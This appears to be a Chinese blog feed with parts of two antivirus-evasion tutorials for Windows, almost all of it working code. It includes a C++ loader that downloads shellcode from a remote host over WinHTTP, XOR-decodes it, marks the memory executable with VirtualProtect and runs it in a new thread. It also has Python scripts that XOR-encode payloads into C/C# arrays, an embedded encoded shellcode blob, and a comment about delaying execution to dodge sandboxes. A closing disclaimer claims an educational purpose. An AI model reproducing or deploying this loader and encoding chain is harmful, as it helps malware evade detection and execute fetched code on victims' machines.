依次关闭request，connect，session句柄</span><br><span class="hljs-keyword">if</span> (hRequest) <span class="hljs-built_in">WinHttpCloseHandle</span>(hRequest);<br><span class="hljs-keyword">if</span> (hConnect) <span class="hljs-built_in">WinHttpCloseHandle</span>(hConnect);<br><span class="hljs-keyword">if</span> (hSession) <span class="hljs-built_in">WinHttpCloseHandle</span>(hSession);<br><br><span class="hljs-comment">/******************   将wchar转换为char  *******************/</span><br><span class="hljs-type">int</span> iSize;<br><span class="hljs-type">char</span>* data;<br><br><span class="hljs-comment">//返回接受字符串所需缓冲区的大小，已经包含字符结尾符&#x27;\0&#x27;</span><br>iSize = <span class="hljs-built_in">WideCharToMultiByte</span>(CP_ACP, <span class="hljs-number">0</span>, pwText, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//iSize =wcslen(pwsUnicode)+1=6</span><br>data = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(iSize * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>)); <span class="hljs-comment">//不需要 pszMultiByte = (char*)malloc(iSize*sizeof(char)+1);</span><br><span class="hljs-built_in">WideCharToMultiByte</span>(CP_ACP, <span class="hljs-number">0</span>, pwText, <span class="hljs-number">-1</span>, data, iSize, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> data;<br>&#125;<br><br><br><br><br><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">StrToShellcode</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span>* length)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">2048</span>];<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> s[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;,&quot;</span>;<br><span class="hljs-type">char</span>* token;<br><span class="hljs-type">char</span>* context;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* 获取第一个子字符串 */</span><br>token = <span class="hljs-built_in">strtok_s</span>(str, s, &amp;context);<br><br><span class="hljs-comment">/* 继续获取其他的子字符串 */</span><br><span class="hljs-keyword">while</span> (token != <span class="hljs-literal">NULL</span>) &#123;<br>buf[i] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)<span class="hljs-built_in">atoi</span>(token);<br><span class="hljs-comment">//printf(&quot;%s  %d\n&quot;, token, i);</span><br><span class="hljs-comment">//printf(&quot;%02x\n&quot;, buf[i]);</span><br>token = <span class="hljs-built_in">strtok_s</span>(<span class="hljs-literal">NULL</span>, s, &amp;context);<br>i++;<br>&#125;<br><br>*length = i; <span class="hljs-comment">// 存储 shellcode 的长度</span><br><span class="hljs-keyword">return</span> buf;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span>* data;<br>DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br>DWORD dwOldProtect; <span class="hljs-comment">// 内存页属性</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> ip[<span class="hljs-number">16</span>] = <span class="hljs-string">&quot;10.211.55.2&quot;</span>;<br><span class="hljs-type">char</span>* ips = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">char</span>*&gt;(ip);<br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> url[<span class="hljs-number">11</span>] = <span class="hljs-string">&quot;calc.txt&quot;</span>;<br><span class="hljs-type">char</span>* urls = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">char</span>*&gt;(url);<br><br>data = <span class="hljs-built_in">WinGet</span>(ips, <span class="hljs-number">80</span>, urls);<br><span class="hljs-comment">//cout &lt;&lt; &quot;返回的数据为: &quot; &lt;&lt; data &lt;&lt; endl;</span><br><br><span class="hljs-comment">//执行shellcode</span><br><span class="hljs-type">int</span> shellcode_length;<br> <span class="hljs-type">char</span>* buf = <span class="hljs-built_in">StrToShellcode</span>(data, &amp;shellcode_length);<br><br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; shellcode_length; i++) &#123;<br> buf[i] ^= <span class="hljs-number">10</span>;<br> &#125;<br><br> <span class="hljs-type">char</span>* shellcode = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<br> <span class="hljs-literal">NULL</span>,<br> shellcode_length,<br> MEM_COMMIT,<br> PAGE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br> );<br><br><br> <span class="hljs-comment">// 将shellcode复制到可读可写的内存页中</span><br> <span class="hljs-built_in">CopyMemory</span>(shellcode, buf, shellcode_length);<br><br> <span class="hljs-built_in">VirtualProtect</span>(shellcode, shellcode_length, PAGE_EXECUTE, &amp;dwOldProtect);<br><br><br> hThread = <span class="hljs-built_in">CreateThread</span>(<br> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br> (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br> &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br> );<br><br> <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="binary-to-decimal脚本"><a href="#binary-to-decimal脚本" class="headerlink" title="binary_to_decimal脚本"></a>binary_to_decimal脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">binary_to_decimal</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        binary_data = file.read()<br><br>    decimal_numbers = [<span class="hljs-built_in">str</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> binary_data]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(decimal_numbers))<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Conversion completed. Decimal numbers saved in <span class="hljs-subst">&#123;output_file&#125;</span>.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python binary_to_decimal.py input_file output_file&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        input_file = sys.argv[<span class="hljs-number">1</span>]<br>        output_file = sys.argv[<span class="hljs-number">2</span>]<br>        binary_to_decimal(input_file, output_file)<br></code></pre></td></tr></table></figure><p><img src="image-20240703015830616.png" alt="image-20240703015830616"></p><h4 id="bin2shellcode"><a href="#bin2shellcode" class="headerlink" title="bin2shellcode"></a>bin2shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser, FileType<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">apply_xor</span>(<span class="hljs-params">bytearray_data, xor_key, output_file=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bytearray_data)):<br>        bytearray_data[i] ^= xor_key<br>    <span class="hljs-keyword">if</span>  output_file:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(bytearray_data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    parser = ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&quot;rb&quot;</span>), <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输入文件路径&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;mode&quot;</span>, choices=[<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;cs&quot;</span>], <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出模式：c 或 cs&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-x&quot;</span>, <span class="hljs-string">&quot;--xor&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;XOR 密钥&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出xor的bin文件&quot;</span>)<br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> args.xor:<br>        xor_key = args.xor<br>    <span class="hljs-keyword">else</span>:<br>        xor_key = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> args.mode == <span class="hljs-string">&quot;c&quot;</span>:<br>        <span class="hljs-comment"># 适用于 C shellcode</span><br>        shellcode = <span class="hljs-string">&quot;\&quot;&quot;</span><br>        ctr = <span class="hljs-number">1</span><br>        maxlen = <span class="hljs-number">15</span><br><br>        bytearray_data = <span class="hljs-built_in">bytearray</span>(args.file.read())<br><br>        <span class="hljs-keyword">if</span> xor_key:<br>            apply_xor(bytearray_data, xor_key, args.output)<br><br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytearray_data:<br>            shellcode += <span class="hljs-string">&quot;\\x&quot;</span> + <span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;02x&#x27;</span>)<br>            <span class="hljs-keyword">if</span> ctr == maxlen:<br>                shellcode += <span class="hljs-string">&quot;\&quot; \n\&quot;&quot;</span><br>                ctr = <span class="hljs-number">0</span><br>            ctr += <span class="hljs-number">1</span><br>        shellcode += <span class="hljs-string">&quot;\&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsigned char buf[] =\n&quot;</span> + shellcode + <span class="hljs-string">&quot;;&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 适用于 C# shellcode</span><br>        shellcode_raw = <span class="hljs-string">&quot;&quot;</span><br>        shellcode_hex = <span class="hljs-string">&quot;&quot;</span><br>        ctr = <span class="hljs-number">1</span><br>        maxlen = <span class="hljs-number">15</span><br><br>        bytearray_data = <span class="hljs-built_in">bytearray</span>(args.file.read())<br><br>        <span class="hljs-keyword">if</span> xor_key:<br>            apply_xor(bytearray_data, xor_key, args.output)<br><br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytearray_data:<br>            shellcode_hex += <span class="hljs-string">&quot;0x&quot;</span> + <span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;02x&#x27;</span>) + <span class="hljs-string">&quot;,&quot;</span><br>            <span class="hljs-keyword">if</span> ctr == maxlen:<br>                shellcode_hex += <span class="hljs-string">&quot;\n&quot;</span><br>                ctr = <span class="hljs-number">0</span><br>            ctr += <span class="hljs-number">1</span><br>        length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bytearray_data))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;byte[] buf = new byte[&quot;</span> + length + <span class="hljs-string">&quot;] &#123;\n&quot;</span> + shellcode_hex[:-<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;&#125;;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="image-20240703015933976.png" alt="image-20240703015933976"></p><p><strong>-o 文件名</strong>，xor后生成新的bin</p><p><img src="image-20240703020010451.png" alt="image-20240703020010451"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://rvn0xsy.github.io/">https://rvn0xsy.github.io</a></p><p><a href="https://luckyfuture.top/BypassAVLearning2.html#%E4%BB%8Eweb%E5%8A%A0%E8%BD%BDshellcode">https://luckyfuture.top/BypassAVLearning2.html#%E4%BB%8Eweb%E5%8A%A0%E8%BD%BDshellcode</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态恶意代码逃逸(二)</title>
    <link href="/2024/06/04/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8-%E4%BA%8C/"/>
    <url>/2024/06/04/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-关于内存申请的优化"><a href="#0x01-关于内存申请的优化" class="headerlink" title="0x01 关于内存申请的优化"></a>0x01 关于内存申请的优化</h2><p>​在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。</p><p>VirtualProtect 是一个Windows函数，用于修改内存页的保护属性。它允许程序员在运行时更改内存页的访问权限，例如将可执行的内存页标记为只读，或将只读内存页标记为可写。</p><p>函数原型如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">VirtualProtect</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPVOID lpAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">  SIZE_T dwSize,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD  flNewProtect,</span></span><br><span class="hljs-params"><span class="hljs-function">  PDWORD lpflOldProtect</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><p><code>lpAddress</code>：指向要修改保护属性的内存页的起始地址。</p></li><li><p><code>dwSize</code>：要修改的内存页的大小，以字节为单位。</p></li><li><pre><code class="hljs">flNewProtect<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs r"><br>  ：新的保护属性，可以是以下值之一：<br><br>  <span class="hljs-operator">-</span> `PAGE_EXECUTE`：可执行和可读。<br>  <span class="hljs-operator">-</span> `PAGE_EXECUTE_READ`：可执行、可读和不能写。<br>  <span class="hljs-operator">-</span> `PAGE_EXECUTE_READWRITE`：可执行、可读和可写。<br>  <span class="hljs-operator">-</span> `PAGE_EXECUTE_WRITECOPY`：可执行、可读和写入时复制。<br>  <span class="hljs-operator">-</span> `PAGE_NOACCESS`：无法访问。<br>  <span class="hljs-operator">-</span> `PAGE_READONLY`：只读。<br>  <span class="hljs-operator">-</span> `PAGE_READWRITE`：可读和可写。<br>  <span class="hljs-operator">-</span> `PAGE_WRITECOPY`：写入时复制。<br><br><span class="hljs-operator">-</span> `lpflOldProtect`：用于存储修改前的保护属性的变量的指针。<br><br>函数返回值为 `BOOL` 类型，如果函数调用成功，则返回非零值；如果函数调用失败，则返回零。可以使用 `GetLastError` 函数获取更多有关错误信息的详细信息。<br><br>```c++<br>#include &lt;Windows.h&gt;<br><br>unsigned char buf[] =<br>&quot;\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a&quot;<br>&quot;\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5&quot;<br>&quot;\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58&quot;<br>&quot;\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb&quot;<br>&quot;\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81&quot;<br>&quot;\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09&quot;<br>&quot;\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81&quot;<br>&quot;\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e&quot;<br>&quot;\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1&quot;<br>&quot;\x87\x57\x60\x0b\x87\x8f\xb8\x0a\x0a\x0a\x5a\x62\x3b\x81\x65&quot;<br>&quot;\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf&quot;<br>&quot;\x36\x0c\x76\x00\x8a\xf1\xea\x7f\x0f\xb1\x4d\x19\x78\x65\x60&quot;<br>&quot;\x0a\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\x0a&quot;;<br><br>// 入口函数<br>int main(int argc, char* argv[]) &#123;<br><br>    int shellcode_size = 0; // shellcode长度<br>    DWORD dwThreadId; // 线程ID<br>    HANDLE hThread; // 线程句柄<br>    DWORD dwOldProtect; // 内存页属性<br>/* length: 800 bytes */<br><br>    // 获取shellcode大小<br>    shellcode_size = sizeof(buf);<br><br>    /* 增加异或代码 */<br>    for (int i = 0; i &lt; shellcode_size; i++) &#123;<br>        buf[i] ^= 10;<br>    &#125;<br>    /*<br>    VirtualAlloc(<br>        NULL, // 基址<br>        800,  // 大小<br>        MEM_COMMIT, // 内存页状态<br>        PAGE_EXECUTE_READWRITE // 可读可写可执行<br>        );<br>    */<br><br>    char* shellcode = (char*)VirtualAlloc(<br>        NULL,<br>        shellcode_size,<br>        MEM_COMMIT,<br>        PAGE_READWRITE // 只申请可读可写<br>    );<br><br>    // 将shellcode复制到可读可写的内存页中<br>    CopyMemory(shellcode, buf, shellcode_size);<br><br>    // 这里开始更改它的属性为可执行<br>    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);<br><br>    // 等待几秒，兴许可以跳过某些沙盒呢？<br><br>    hThread = CreateThread(<br>        NULL, // 安全描述符<br>        NULL, // 栈的大小<br>        (LPTHREAD_START_ROUTINE)shellcode, // 函数<br>        NULL, // 参数<br>        NULL, // 线程标志<br>        &amp;dwThreadId // 线程ID<br>    );<br><br>    WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束<br>    return 0;<br>&#125;<br><br></code></pre></td></tr></table></figure></code></pre></li></ul><p>​</p><h3 id="0x02-InterlockedXorRelease函数"><a href="#0x02-InterlockedXorRelease函数" class="headerlink" title="0x02 InterlockedXorRelease函数"></a>0x02 InterlockedXorRelease函数</h3><p>我在学习《Windows核心编程》的过程中，发现InterlockedXorRelease函数可以用于两个值的异或运算，最重要的一点就是，它的操作是原子的，也就是可以达到线程同步。</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">_InterlockedXor8</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">char</span> <span class="hljs-keyword">volatile</span> *Destination,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">char</span>          Value</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>Destination</code>：指向要执行异或操作的变量的指针。这个参数应该是一个 <code>volatile char</code> 类型的指针，表示一个 8 位有符号整数变量。</li><li><code>Value</code>：要与 <code>Destination</code> 变量进行异或操作的值。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; shellcode_size; i++) &#123;<br>    <span class="hljs-comment">//buf[i] ^= 10;</span><br>    _InterlockedXor8(buf + i, <span class="hljs-number">10</span>);   <span class="hljs-comment">//bu按位xor</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><br> <span class="hljs-type">char</span> buf[] =<br><span class="hljs-string">&quot;\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a&quot;</span><br><span class="hljs-string">&quot;\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5&quot;</span><br><span class="hljs-string">&quot;\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58&quot;</span><br><span class="hljs-string">&quot;\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb&quot;</span><br><span class="hljs-string">&quot;\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81&quot;</span><br><span class="hljs-string">&quot;\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09&quot;</span><br><span class="hljs-string">&quot;\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81&quot;</span><br><span class="hljs-string">&quot;\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e&quot;</span><br><span class="hljs-string">&quot;\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1&quot;</span><br><span class="hljs-string">&quot;\x87\x57\x60\x0b\x87\x8f\xb8\x0a\x0a\x0a\x5a\x62\x3b\x81\x65&quot;</span><br><span class="hljs-string">&quot;\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf&quot;</span><br><span class="hljs-string">&quot;\x36\x0c\x76\x00\x8a\xf1\xea\x7f\x0f\xb1\x4d\x19\x78\x65\x60&quot;</span><br><span class="hljs-string">&quot;\x0a\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\x0a&quot;</span>;<br><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> </span>&#123;<br><br>    <span class="hljs-type">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br>    DWORD dwOldProtect; <span class="hljs-comment">// 